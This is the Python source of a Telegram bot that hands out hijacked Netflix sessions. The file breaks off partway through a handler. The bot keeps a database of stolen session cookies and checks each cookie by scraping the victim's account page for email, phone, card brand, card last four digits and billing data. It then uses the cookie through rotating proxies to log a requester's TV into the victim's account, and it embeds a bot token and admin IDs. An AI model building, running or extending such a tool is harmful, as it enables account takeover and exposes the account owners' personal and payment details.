#!/usr/bin/env python3
"""
Netflix TV Login Bot — Ultimate Edition v2.0
Features: Credits system, SQLite vault, bulk cookies, inline buttons,
          admin direct upload, real-time status, broadcast, user management
"""

import asyncio
import io
import json
import os
import random
import re
import sqlite3
import string
import sys
import threading
import time
import urllib.parse
import zipfile
from datetime import datetime

import requests
from urllib3.exceptions import InsecureRequestWarning
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)
from telegram.constants import ParseMode

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════════
#  CONFIG  —  edit before running
# ══════════════════════════════════════════════════════════════════════
BOT_TOKEN        = "8834589135:AAF20dbfsxvDZOBL3N1t87NZafIkgEl9lpw"
ADMIN_IDS  = [6824677136,8033719088]           # your Telegram user ID(s)
SUPPORT_USERNAME = "sagarkun0"        # t.me/your_support  (no @)
CHANNEL_USERNAME = "foryoubysagar"        # optional, for join-check

PROXY_FILE       = "proxy.txt"
DB_FILE          = "nfbot.db"
REQUEST_TIMEOUT  = 15
MAX_CREDITS      = 3
CREDIT_RESET_HRS = 12
MAX_COOKIE_ATTEMPTS = 60

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES  = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES   = {n.lower(): n for n in ALL_COOKIE_NAMES}

# ══════════════════════════════════════════════════════════════════════
#  RUNTIME STATE
# ══════════════════════════════════════════════════════════════════════
cookie_lock  = threading.Lock()
stats_lock   = threading.Lock()
active_lock  = threading.Lock()
active_users = {}   # user_id → last_seen unix ts

rt_stats = {
    "total_logins":   0,
    "successful":     0,
    "failed":         0,
    "codes_rejected": 0,
    "started_at":     datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

# ══════════════════════════════════════════════════════════════════════
#  COUNTRY FLAGS
# ══════════════════════════════════════════════════════════════════════
COUNTRY_FLAGS = {
    "IN":"🇮🇳","US":"🇺🇸","GB":"🇬🇧","UK":"🇬🇧","CA":"🇨🇦",
    "AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷","JP":"🇯🇵","BR":"🇧🇷",
    "MX":"🇲🇽","IT":"🇮🇹","ES":"🇪🇸","KR":"🇰🇷","NL":"🇳🇱",
    "SG":"🇸🇬","ID":"🇮🇩","TH":"🇹🇭","PH":"🇵🇭","MY":"🇲🇾",
    "PK":"🇵🇰","BD":"🇧🇩","NP":"🇳🇵","LK":"🇱🇰","SA":"🇸🇦",
    "AE":"🇦🇪","TR":"🇹🇷","RU":"🇷🇺","PL":"🇵🇱","AR":"🇦🇷",
    "CL":"🇨🇱","CO":"🇨🇴","ZA":"🇿🇦","NG":"🇳🇬","EG":"🇪🇬",
    "PT":"🇵🇹","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮",
    "AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","GR":"🇬🇷","CZ":"🇨🇿",
    "HU":"🇭🇺","RO":"🇷🇴","UA":"🇺🇦","VN":"🇻🇳","TW":"🇹🇼",
    "HK":"🇭🇰","IL":"🇮🇱","QA":"🇶🇦","KW":"🇰🇼","OM":"🇴🇲",
}

def get_flag(code):
    return COUNTRY_FLAGS.get((code or "").upper().strip(), "")

# ══════════════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════════════
def init_db():
    con = sqlite3.connect(DB_FILE)
    con.executescript("""
        CREATE TABLE IF NOT EXISTS cookies (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            source      TEXT DEFAULT 'unknown',
            data        TEXT NOT NULL,
            added_at    INTEGER DEFAULT (strftime('%s','now')),
            used        INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS idx_cookies_used ON cookies(used);

        CREATE TABLE IF NOT EXISTS users (
            user_id          INTEGER PRIMARY KEY,
            first_name       TEXT DEFAULT '',
            username         TEXT DEFAULT '',
            credits_used     INTEGER DEFAULT 0,
            last_reset       INTEGER DEFAULT 0,
            total_logins     INTEGER DEFAULT 0,
            successful_logins INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS login_log (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id      INTEGER,
            tv_code      TEXT,
            success      INTEGER DEFAULT 0,
            cookie_source TEXT DEFAULT '',
            country      TEXT DEFAULT '',
            ts           INTEGER DEFAULT (strftime('%s','now'))
        );
    """)
    con.commit()
    con.close()

def db():
    con = sqlite3.connect(DB_FILE, check_same_thread=False)
    con.row_factory = sqlite3.Row
    return con

# ── user helpers ──────────────────────────────────────────────────────
def ensure_user(user_id, first_name="", username=""):
    c = db()
    c.execute(
        "INSERT OR IGNORE INTO users (user_id, first_name, username) VALUES (?,?,?)",
        (user_id, first_name, username)
    )
    c.execute(
        "UPDATE users SET first_name=?, username=? WHERE user_id=?",
        (first_name, username, user_id)
    )
    c.commit()
    c.close()

def get_user_row(user_id):
    c = db()
    row = c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    c.close()
    return dict(row) if row else {}

# ── credits ───────────────────────────────────────────────────────────
def check_and_use_credit(user_id):
    """Returns (allowed, credits_remaining, reset_in_seconds)"""
    now  = int(time.time())
    span = CREDIT_RESET_HRS * 3600
    c    = db()
    row  = c.execute("SELECT credits_used, last_reset FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row:
        c.close()
        return False, 0, 0

    used, last_reset = row["credits_used"], row["last_reset"]

    if now - last_reset >= span:
        c.execute("UPDATE users SET credits_used=0, last_reset=? WHERE user_id=?", (now, user_id))
        c.commit()
        used, last_reset = 0, now

    left = MAX_CREDITS - used
    if left <= 0:
        c.close()
        return False, 0, span - (now - last_reset)

    c.execute(
        "UPDATE users SET credits_used=credits_used+1, total_logins=total_logins+1 WHERE user_id=?",
        (user_id,)
    )
    c.commit()
    c.close()
    return True, left - 1, 0

def get_credits_status(user_id):
    """Returns (credits_left, reset_in_seconds)"""
    now  = int(time.time())
    span = CREDIT_RESET_HRS * 3600
    c    = db()
    row  = c.execute("SELECT credits_used, last_reset FROM users WHERE user_id=?", (user_id,)).fetchone()
    c.close()
    if not row:
        return MAX_CREDITS, 0
    used, last_reset = row["credits_used"], row["last_reset"]
    if now - last_reset >= span:
        return MAX_CREDITS, 0
    return max(0, MAX_CREDITS - used), span - (now - last_reset)

def refund_credit(user_id):
    c = db()
    c.execute("UPDATE users SET credits_used=MAX(0,credits_used-1), total_logins=MAX(0,total_logins-1) WHERE user_id=?", (user_id,))
    c.commit()
    c.close()

def mark_successful_login(user_id):
    c = db()
    c.execute("UPDATE users SET successful_logins=successful_logins+1 WHERE user_id=?", (user_id,))
    c.commit()
    c.close()

def get_user_success_count(user_id):
    c = db()
    row = c.execute("SELECT successful_logins FROM users WHERE user_id=?", (user_id,)).fetchone()
    c.close()
    return row["successful_logins"] if row else 0

# ── cookie vault (SQLite) ─────────────────────────────────────────────
def store_cookies_bulk(cookies_list, source="unknown"):
    if not cookies_list:
        return 0
    c   = db()
    cur = c.cursor()
    added = 0
    for cdict in cookies_list:
        if "NetflixId" in cdict:
            cur.execute(
                "INSERT INTO cookies (source, data) VALUES (?,?)",
                (source, json.dumps(cdict))
            )
            added += 1
    c.commit()
    c.close()
    return added

def pop_random_cookie():
    """Mark one random cookie as used and return (source, dict). Thread-safe."""
    with cookie_lock:
        c   = db()
        row = c.execute(
            "SELECT id, source, data FROM cookies WHERE used=0 ORDER BY RANDOM() LIMIT 1"
        ).fetchone()
        if not row:
            c.close()
            return None, None
        c.execute("UPDATE cookies SET used=1 WHERE id=?", (row["id"],))
        c.commit()
        c.close()
        try:
            return row["source"], json.loads(row["data"])
        except Exception:
            return None, None

def count_vault():
    c   = db()
    row = c.execute("SELECT COUNT(*) AS n FROM cookies WHERE used=0").fetchone()
    c.close()
    return row["n"] if row else 0

# ══════════════════════════════════════════════════════════════════════
#  PROXY LOADER
# ══════════════════════════════════════════════════════════════════════
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    m = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line, re.IGNORECASE,
    )
    if m:
        d = m.groupdict()
        h = d["host"].strip("[]")
        url = (f"{d['scheme']}://{d['user']}:{d['password']}@{h}:{d['port']}"
               if d.get("user") else f"{d['scheme']}://{h}:{d['port']}")
        return {"http": url, "https": url}
    parts = line.split(":")
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit():
            url = f"http://{c}:{d}@{a}:{b}"
            return {"http": url, "https": url}
        if d.isdigit():
            url = f"http://{a}:{b}@{c}:{d}"
            return {"http": url, "https": url}
    m = re.match(r"^([^:\s]+):(\d+)$", line)
    if m:
        url = f"http://{m.group(1)}:{m.group(2)}"
        return {"http": url, "https": url}
    return None

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, "r", encoding="utf-8") as f:
        return [p for p in (parse_proxy_line(l) for l in f) if p]

proxies_list = load_proxies()

# ══════════════════════════════════════════════════════════════════════
#  COOKIE EXTRACTION  —  multi-account per file
# ══════════════════════════════════════════════════════════════════════
def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())

def is_netflix_cookie(domain, name):
    return (canonicalize_name(name) in ALL_COOKIE_NAMES
            or "netflix." in str(domain or "").lower())

def _entries_to_dict(entries):
    cookies = {}
    for e in entries:
        if e["name"] not in cookies:
            cookies[e["name"]] = e["value"]
    return cookies if "NetflixId" in cookies else None

def _parse_netscape_block(text):
    entries = []
    for line in text.splitlines():
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) < 7:
            parts = re.split(r"\s+", line, maxsplit=6)
        if len(parts) < 7:
            continue
        if parts[1].upper() not in ("TRUE", "FALSE"):
            continue
        if parts[3].upper() not in ("TRUE", "FALSE"):
            continue
        if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
            continue
        name = canonicalize_name(parts[5])
        if not is_netflix_cookie(parts[0], name):
            continue
        entries.append({"name": name, "value": parts[6].strip()})
    return entries

def _parse_raw_block(text):
    pat = re.compile(
        r"(?:['\"])?(?P<name>"
        + "|".join(sorted(ALL_COOKIE_NAMES, key=len, reverse=True))
        + r")(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
        re.IGNORECASE,
    )
    entries = []
    for m in pat.finditer(text):
        name  = canonicalize_name(m.group("name"))
        value = m.group("value").strip("'\"").rstrip(",")
        entries.append({"name": name, "value": value})
    return _entries_to_dict(entries) if entries else None

def _parse_json_content(text):
    """Extract one or multiple cookie sets from JSON."""
    try:
        data = json.loads(text)
    except Exception:
        return []
    results = []

    # Array of arrays → each inner array is one account
    if isinstance(data, list) and data and isinstance(data[0], list):
        for block in data:
            entries = [
                {"name": canonicalize_name(c.get("name", "")), "value": c.get("value", "")}
                for c in block
                if isinstance(c, dict)
                and is_netflix_cookie(c.get("domain", ""), c.get("name", ""))
            ]
            d = _entries_to_dict(entries)
            if d:
                results.append(d)
        return results

    # Flat list of cookie objects → single account
    if isinstance(data, list):
        entries = [
            {"name": canonicalize_name(c.get("name", "")), "value": c.get("value", "")}
            for c in data
            if isinstance(c, dict)
            and is_netflix_cookie(c.get("domain", ""), c.get("name", ""))
        ]
        d = _entries_to_dict(entries)
        return [d] if d else []

    # Single dict (possibly with a "cookies" key)
    if isinstance(data, dict):
        sub = data.get("cookies") or data.get("items") or [data]
        entries = [
            {"name": canonicalize_name(c.get("name", "")), "value": c.get("value", "")}
            for c in sub
            if isinstance(c, dict)
            and is_netflix_cookie(c.get("domain", ""), c.get("name", ""))
        ]
        d = _entries_to_dict(entries)
        return [d] if d else []

    return []

# Separator patterns that delimit multiple accounts inside one file
_BLOCK_SEP = re.compile(
    r"(?:"
    r"={5,}|"
    r"-{5,}|"
    r"#{5,}|"
    r"# Netscape HTTP Cookie File|"
    r"\[Account[ _]?\d+\]|"
    r"# Account[ _]?\d+|"
    r"# Cookie[ _]?\d+|"
    r"# User[ _]?\d+"
    r")",
    re.IGNORECASE,
)

def extract_all_cookies_from_content(content):
    """
    Parse ONE file and return a LIST of cookie dicts.
    Handles: multiple Netscape blocks, JSON arrays, separator-delimited sets.
    """
    # 1. JSON first (handles arrays of accounts natively)
    json_result = _parse_json_content(content)
    if json_result:
        return json_result

    results = []

    # 2. Split on common separators
    blocks = _BLOCK_SEP.split(content)

    for block in blocks:
        block = block.strip()
        if not block:
            continue
        entries = _parse_netscape_block(block)
        d = _entries_to_dict(entries)
        if d:
            results.append(d)
        else:
            d = _parse_raw_block(block)
            if d:
                results.append(d)

    # 3. Fallback: whole file as one block
    if not results:
        entries = _parse_netscape_block(content)
        d = _entries_to_dict(entries)
        if d:
            results.append(d)
        else:
            d = _parse_raw_block(content)
            if d:
                results.append(d)

    return results

# ══════════════════════════════════════════════════════════════════════
#  NETFLIX ACCOUNT INFO
# ══════════════════════════════════════════════════════════════════════
def _re_get(patterns, text, default="Unknown"):
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            v = m.group(1).strip()
            return v if v else default
    return default

def validate_and_get_info(cookies, proxy=None):
    """Validate cookie + extract detailed account info. Returns (valid, info_dict)."""
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
        )
        if r.status_code != 200:
            return False, {}
        t = r.text

        info = {
            "country": _re_get([
                r'"currentCountry"\s*:\s*"([^"]+)"',
                r'"countryOfSignup"\s*:\s*"([^"]+)"',
                r'"userCountry"\s*:\s*"([^"]+)"',
            ], t),
            "plan": _re_get([
                r'"localizedPlanName"\s*:\s*"([^"]+)"',
                r'"planName"\s*:\s*"([^"]+)"',
                r'"membershipStatus"\s*:\s*"([^"]+)"',
            ], t),
            "email": _re_get([
                r'"primaryEmail"\s*:\s*"([^"]+)"',
                r'"email"\s*:\s*"([^@"]+@[^"]+)"',
            ], t),
            "name": _re_get([
                r'"firstName"\s*:\s*"([^"]+)"',
                r'"name"\s*:\s*"([^"]{2,})"',
                r'"profileName"\s*:\s*"([^"]+)"',
            ], t),
            "phone": _re_get([
                r'"phoneNumber"\s*:\s*"([^"]+)"',
                r'"phone"\s*:\s*"(\+?[0-9\s\-]+)"',
            ], t),
            "phone_verified": _re_get([
                r'"phoneVerified"\s*:\s*(true|false)',
                r'"phoneNumberVerified"\s*:\s*(true|false)',
            ], t),
            "member_since": _re_get([
                r'"memberSince"\s*:\s*"([^"]+)"',
                r'"signupDate"\s*:\s*"([^"]+)"',
                r'"membershipStartDate"\s*:\s*"([^"]+)"',
            ], t),
            "next_billing": _re_get([
                r'"nextBillingDate"\s*:\s*"([^"]+)"',
                r'"billingDate"\s*:\s*"([^"]+)"',
                r'"renewalDate"\s*:\s*"([^"]+)"',
            ], t),
            "price": _re_get([
                r'"localizedCost"\s*:\s*"([^"]+)"',
                r'"localeCost"\s*:\s*"([^"]+)"',
                r'"planCost"\s*:\s*"([^"]+)"',
            ], t),
            "payment_method": _re_get([
                r'"paymentMethodType"\s*:\s*"([^"]+)"',
                r'"paymentType"\s*:\s*"([^"]+)"',
                r'"billingType"\s*:\s*"([^"]+)"',
            ], t),
            "card_brand": _re_get([
                r'"creditCardBrand"\s*:\s*"([^"]+)"',
                r'"cardBrand"\s*:\s*"([^"]+)"',
            ], t),
            "last4": _re_get([
                r'"creditCardLastFour"\s*:\s*"(\d{4})"',
                r'"lastFour"\s*:\s*"(\d{4})"',
                r'"last4"\s*:\s*"(\d{4})"',
            ], t),
            "max_streams": _re_get([
                r'"maxStreams"\s*:\s*(\d+)',
                r'"simultaneousStreams"\s*:\s*(\d+)',
                r'"numSimultaneousStreams"\s*:\s*(\d+)',
            ], t),
            "video_quality": _re_get([
                r'"videoQuality"\s*:\s*"([^"]+)"',
                r'"maxVideoQuality"\s*:\s*"([^"]+)"',
                r'"streamingQuality"\s*:\s*"([^"]+)"',
            ], t),
            "profiles": _re_get([
                r'"numProfiles"\s*:\s*(\d+)',
                r'"allowedNumberOfProfiles"\s*:\s*(\d+)',
            ], t),
            "extra_member": _re_get([
                r'"extraMember"\s*:\s*"?([^",\s]+)"?',
                r'"allowedExtraMembers"\s*:\s*(\d+)',
            ], t),
        }
        return True, info
    except Exception:
        return False, {}

# ══════════════════════════════════════════════════════════════════════
#  TV CODE DETECTION
# ══════════════════════════════════════════════════════════════════════
TV_ERROR_PATTERNS = [
    r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong)",
    r"try again", r"c[oó]digo (es |que ingresaste |no es |incorrecto|inv[aá]lido)",
    r"ese c[oó]digo no", r"int[ée]ntalo de nuevo",
    r"code (est |n'est pas |incorrect|invalide)", r"r[ée]essayez",
    r"code (ist |ung[uü]ltig|falsch)", r"versuchen sie es erneut",
    r"codice (non [eè] |sbagliato|non valido)", r"riprova",
    r"kod (yanlış|ge[çc]ersiz|hatalı)", r"tekrar dene",
    r"الرمز (غير صحيح|خطأ)", r"حاول مرة أخرى",
    r"код (неверный|неправильный)", r"попробуйте",
    r"代码(有误|错误|无效)", r"请重试",
    r"코드(가|는)?(잘못|틀렸)", r"다시 시도",
    r"コード(が|は)?(間違|違)", r"もう一度",
    r"kode (salah|tidak valid)", r"coba lagi",
]

TV_SUCCESS_PATTERNS = [
    r"your tv is ready", r"tu tv est[aá] lista",
    r"sua tv est[aá] pronta", r"votre t[ée]l[ée] est pr[eê]t",
    r"dein tv ist bereit",   r"la tua tv [eè] pronta",
    r"tv'niz hazır",
]

def _is_tv_error(text):
    low = text.lower()
    return any(re.search(p, low) for p in TV_ERROR_PATTERNS)

def _is_tv_success(url, text):
    if "/tv/out/success" in url.lower():
        return True
    return any(re.search(p, text.lower()) for p in TV_SUCCESS_PATTERNS)

def _extract_auth_url(html):
    for pat in [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'["\']authURL["\']\s*:\s*["\']([^"\']+)["\']',
        r'value="(c1\.[^"]+)"',
    ]:
        m = re.search(pat, html)
        if m:
            return urllib.parse.unquote(m.group(1))
    return None

def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    hdr = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get(url, headers=hdr, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": "Netflix TV page unavailable"}
    except Exception:
        return {"success": False, "error": "Connection failed"}

    auth_url = _extract_auth_url(r.text)
    if not auth_url:
        fb = re.search(r'c1\.[a-zA-Z0-9%+=/]+', r.text)
        if fb:
            auth_url = fb.group(0)
        else:
            return {"success": False, "error": "Could not load activation page"}

    form = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }
    post_hdr = {
        **hdr,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }
    try:
        r = session.post(
            url, data=form, headers=post_hdr,
            proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True,
        )
    except Exception:
        return {"success": False, "error": "Activation request failed"}

    final_url = getattr(r, "url", url)
    if "/tv/out/success" in final_url.lower():
        return {"success": True}

    import html as _html
    txt = r.text
    txt = re.sub(r'<script[^>]*>.*?</script>', '', txt, flags=re.DOTALL | re.IGNORECASE)
    txt = re.sub(r'<style[^>]*>.*?</style>',  '', txt, flags=re.DOTALL | re.IGNORECASE)
    txt = re.sub(r'<[^>]+>', ' ', txt)
    txt = _html.unescape(txt)
    txt = re.sub(r'\s+', ' ', txt).strip()

    if _is_tv_error(txt):
        return {"success": False, "error": "Invalid or expired TV code"}
    if _is_tv_success(final_url, txt):
        return {"success": True}
    return {"success": False, "error": "Unknown response from Netflix"}

def process_tv_login(tv_code):
    """Blocking — run in thread pool."""
    max_tries = min(MAX_COOKIE_ATTEMPTS, max(count_vault(), 1))
    for _ in range(max_tries):
        source, cookies = pop_random_cookie()
        if not cookies:
            return {"success": False, "error": "no_cookies"}
        proxy = random.choice(proxies_list) if proxies_list else None
        valid, info = validate_and_get_info(cookies, proxy)
        if not valid:
            continue
        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code, proxy)
        result["info"]          = info
        result["cookie_source"] = source
        return result
    return {"success": False, "error": "all_dead"}

# ══════════════════════════════════════════════════════════════════════
#  MESSAGE BUILDERS
# ══════════════════════════════════════════════════════════════════════
def fmt_seconds(s):
    h, m = int(s) // 3600, (int(s) % 3600) // 60
    return f"{h}h {m}m" if h else f"{m}m"

def credits_bar(left):
    return "🟢" * left + "⚫" * (MAX_CREDITS - left)

def build_success_msg(tv_code, info, source, login_no):
    country = info.get("country", "Unknown")
    flag    = get_flag(country)
    country_str = f"{country} {flag}" if flag else country

    def v(key):
        val = info.get(key, "")
        return val if val and val != "Unknown" else "Unknown"

    return (
        f"✅ <b>Logged in successfully!</b>\n\n"
        f"🔹 <b>PREMIUM ACCOUNT #{login_no}</b>\n"
        f"📁 Source: <code>{source}</code>\n"
        f"👤 Name: <b>{v('name')}</b>\n"
        f"🌍 Country: <b>{country_str}</b> (<code>{country}</code>)\n"
        f"📋 Plan: <b>{v('plan')}</b>\n"
        f"💰 Price: <b>{v('price')}</b>\n"
        f"📅 Member Since: <b>{v('member_since')}</b>\n"
        f"📅 Next Billing: <b>{v('next_billing')}</b>\n"
        f"💳 Payment Method: <b>{v('payment_method')}</b>\n"
        f"🏦 Card Brand: <b>{v('card_brand')}</b>\n"
        f"🔢 Last 4 Digits: <b>{v('last4')}</b>\n"
        f"📞 Phone: <b>{v('phone')}</b>\n"
        f"✅ Phone Verified: <b>{v('phone_verified')}</b>\n"
        f"🎥 Video Quality: <b>{v('video_quality')}</b>\n"
        f"📺 Max Streams: <b>{v('max_streams')}</b>\n"
        f"👥 Connected Profiles: <b>{v('profiles')}</b>\n"
        f"📧 Email: <b>{v('email')}</b>\n"
        f"🔓 Extra Member Slot: <b>{v('extra_member')}</b>\n\n"
        f"🍿 <b>Enjoy your Netflix!</b>\n\n"
        f"<i>Use /tv CODE to login another TV.</i>"
    )

# ══════════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════════════
def main_kb():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📺 How to Get TV Code", callback_data="help_tv"),
            InlineKeyboardButton("💳 My Credits",         callback_data="my_credits"),
        ],
        [
            InlineKeyboardButton("📊 Bot Status",  callback_data="public_status"),
            InlineKeyboardButton("💬 Support",     url=f"https://t.me/{SUPPORT_USERNAME}"),
        ],
    ])

def back_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_start")],
    ])

def after_login_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📺 Login Another TV",  callback_data="help_tv")],
        [InlineKeyboardButton("💬 Support",            url=f"https://t.me/{SUPPORT_USERNAME}")],
    ])

def error_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔁 Try Again",  callback_data="help_tv")],
        [InlineKeyboardButton("💬 Support",    url=f"https://t.me/{SUPPORT_USERNAME}")],
    ])

# ══════════════════════════════════════════════════════════════════════
#  ANIMATION
# ══════════════════════════════════════════════════════════════════════
BRAILLE = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
PHASES  = [
    "Scanning vault for cookies",
    "Validating Netflix account",
    "Submitting TV code to Netflix",
    "Finalizing login",
]

async def animate(context, chat_id, msg_id, stop_event, tv_code):
    i = 0
    while not stop_event.is_set():
        frame = BRAILLE[i % len(BRAILLE)]
        phase = PHASES[min(i // 15, len(PHASES) - 1)]
        dots  = "." * ((i // 3) % 4)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=(
                    f"{frame} <b>{phase}{dots}</b>\n\n"
                    f"📺 Code: <code>{tv_code}</code>\n"
                    f"<i>Hold tight, this takes a few seconds...</i>"
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        i += 1
        await asyncio.sleep(0.4)

# ══════════════════════════════════════════════════════════════════════
#  BOT HANDLERS
# ══════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ensure_user(user.id, user.first_name or "", user.username or "")
    with active_lock:
        active_users[user.id] = time.time()
    credits_left, reset_in = get_credits_status(user.id)
    vault = count_vault()
    await update.message.reply_text(
        f"👋 <b>Hey {user.first_name}!</b>\n\n"
        f"🎬 <b>Netflix TV Login Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Activate Netflix on your TV instantly.\n"
        f"Just send your TV code — we handle everything!\n\n"
        f"💳 Credits: <b>{credits_bar(credits_left)} {credits_left}/{MAX_CREDITS}</b>\n"
        f"🍪 Vault: <b>{vault} cookies available</b>\n\n"
        f"<b>Usage:</b>\n"
        f"  /tv 1234-5678\n"
        f"  /tv 1234 5678\n"
        f"  /tv 12345678",
        parse_mode=ParseMode.HTML,
        reply_markup=main_kb(),
    )


async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user    = update.effective_user
    chat_id = update.effective_chat.id
    msg_id  = update.message.message_id

    ensure_user(user.id, user.first_name or "", user.username or "")
    with active_lock:
        active_users[user.id] = time.time()

    # ── parse code ────────────────────────────────────────────────────
    raw     = " ".join(context.args) if context.args else ""
    tv_code = re.sub(r"\D", "", raw)

    if not raw:
        await update.message.reply_text(
            "❌ <b>Please provide the TV code.</b>\n\n"
            "✅ <b>Usage:</b> /tv 1234-5678\n\n"
            "Supported formats:\n"
            "• /tv 1234-5678\n"
            "• /tv 1234 5678\n"
            "• /tv 12345678",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=msg_id,
        )
        return

    if len(tv_code) != 8:
        await update.message.reply_text(
            f"❌ <b>Invalid TV code format.</b>\n\n"
            f"You sent: <code>{raw}</code>\n"
            f"Digits found: <b>{len(tv_code)}</b> — need exactly 8.\n\n"
            f"💡 Example: <code>/tv 1234-5678</code>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=msg_id,
        )
        return

    # ── check vault first so we don't burn a credit for nothing ───────
    if count_vault() == 0:
        await update.message.reply_text(
            "😔 <b>Vault is empty!</b>\n\n"
            "No cookies available right now.\n"
            "Please wait while the admin restocks.\n\n"
            "<i>Your credits are not affected.</i>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=msg_id,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("💬 Support", url=f"https://t.me/{SUPPORT_USERNAME}")
            ]]),
        )
        return

    # ── check credits ──────────────────────────────────────────────────
    allowed, credits_left, reset_in = check_and_use_credit(user.id)
    if not allowed:
        await update.message.reply_text(
            f"⛔ <b>No Credits Left!</b>\n\n"
            f"{credits_bar(0)} <b>0/{MAX_CREDITS}</b>\n\n"
            f"⏰ Resets in: <b>{fmt_seconds(reset_in)}</b>\n"
            f"Credits refill every <b>{CREDIT_RESET_HRS} hours</b>.\n\n"
            f"Need more? Contact support.",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=msg_id,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("💬 Support", url=f"https://t.me/{SUPPORT_USERNAME}")
            ]]),
        )
        return

    # ── show spinner ───────────────────────────────────────────────────
    status_msg = await update.message.reply_text(
        f"⠋ <b>Starting TV login...</b>\n\n"
        f"📺 Code: <code>{tv_code}</code>\n"
        f"<i>Hold tight...</i>",
        parse_mode=ParseMode.HTML,
        reply_to_message_id=msg_id,
    )

    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(
        animate(context, chat_id, status_msg.message_id, stop_anim, tv_code)
    )

    # ── run login in thread ────────────────────────────────────────────
    result = await asyncio.to_thread(process_tv_login, tv_code)

    stop_anim.set()
    anim_task.cancel()
    await asyncio.sleep(0.3)

    # ── log to DB ──────────────────────────────────────────────────────
    success_flag = 1 if result.get("success") else 0
    info_dict    = result.get("info", {})
    c = db()
    c.execute(
        "INSERT INTO login_log (user_id, tv_code, success, cookie_source, country) VALUES (?,?,?,?,?)",
        (user.id, tv_code, success_flag,
         result.get("cookie_source", ""), info_dict.get("country", "")),
    )
    c.commit()
    c.close()

    with stats_lock:
        rt_stats["total_logins"] += 1
        if success_flag:
            rt_stats["successful"] += 1
        else:
            rt_stats["failed"] += 1

    # ── respond ────────────────────────────────────────────────────────
